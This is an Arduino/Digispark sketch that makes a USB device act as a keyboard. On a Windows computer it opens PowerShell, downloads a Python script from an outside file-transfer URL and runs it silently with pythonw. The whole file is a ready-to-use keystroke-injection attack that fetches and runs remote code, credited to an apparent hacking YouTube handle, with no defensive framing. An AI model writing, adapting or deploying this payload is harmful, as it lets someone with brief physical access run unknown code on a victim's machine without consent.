
// scripted by @ashwanthcreators in github @ashwanthhacker15 in youtube
#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
    DigiKeyboard.print("cd \\; md net; cd net; del http.py; powershell Invoke-WebRequest -Outfile http.py 'https://s21.filetransfer.io/storage/download/v34k8w83stf6'") ;
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(4000);
 DigiKeyboard.print("pythonw http.py ");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(3000);
  DigiKeyboard.print("EXIT");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {

}
}
